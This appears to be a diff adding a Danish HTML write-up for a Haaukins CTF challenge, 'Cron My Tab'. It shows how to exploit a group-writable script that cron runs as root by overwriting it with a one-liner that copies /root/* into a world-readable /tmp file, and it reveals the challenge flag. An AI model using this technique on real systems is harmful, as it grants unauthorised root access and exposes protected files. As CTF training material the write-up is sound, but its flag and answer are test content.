@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Cron My Tab — tutorial (writable root-cron)</title>
+<meta name="description" content="Guide til Haaukins Cron My Tab: overskriv et group-writable script der køres som root af cron, og ryd op bagefter.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Cron My Tab</h1>
+<p class="subtitle">Overskriv et root-cron-script din gruppe kan skrive til.</p>
+<div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>ssh doomguy@crontab.hkn       # groups: ... root-traverse
+cat /etc/cron.d/execute-cron  # * * * * * /etc/read.sh (kører som root hvert minut)
+ls -la /etc/read.sh           # ---x-w----  root  root-traverse   (din gruppe = skriv)
+# overskriv + selv-gendan:
+printf '#!/bin/bash\ncat /root/* > /tmp/c_root 2>/dev/null; chmod 777 /tmp/c_root\nprintf "#!/bin/bash\\n" > /etc/read.sh\n' > /etc/read.sh
+# vent ~60s -> cat /tmp/c_root</code></pre>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">DDC{v3ry-funny-cr0n-j0b}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>En fil der køres som root af cron + din gruppe kan skrive = privesc (selv <code>---x-w----</code>).</li><li>Lad payloaden gendanne scriptet — efterlad ikke en root-backdoor.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
